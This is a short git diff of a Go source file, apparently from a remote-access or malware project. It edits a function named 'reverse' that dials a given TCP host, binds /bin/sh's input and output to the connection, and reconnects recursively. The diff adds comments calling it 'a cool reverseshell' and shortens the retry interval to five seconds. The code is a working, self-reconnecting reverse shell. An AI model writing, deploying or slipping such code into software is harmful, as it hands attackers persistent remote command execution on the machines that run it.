@@ -77,19 +77,30 @@ func Decryption(message string, local_priv_key rsa.PrivateKey) string {
 }
 
 func reverse(host string) {
+	//A cool reverseshell in go
+
+	//Sending connection
 	connection, err := net.Dial("tcp", host)
 	if nil != err {
 		if nil != connection {
 			connection.Close()
 		}
-		time.Sleep(time.Minute)
+		time.Sleep(5 * time.Second)
 		reverse(host)
 	}
-
+	//Use /bin/sh
 	cmd := exec.Command("/bin/sh")
+
+	//Get user command
 	cmd.Stdin, cmd.Stdout, cmd.Stderr = connection, connection, connection
+
+	//Launch user command and send user command output
 	cmd.Run()
+	
+	//Close connection
 	connection.Close()
+
+	//Recursion
 	reverse(host)
 }
 
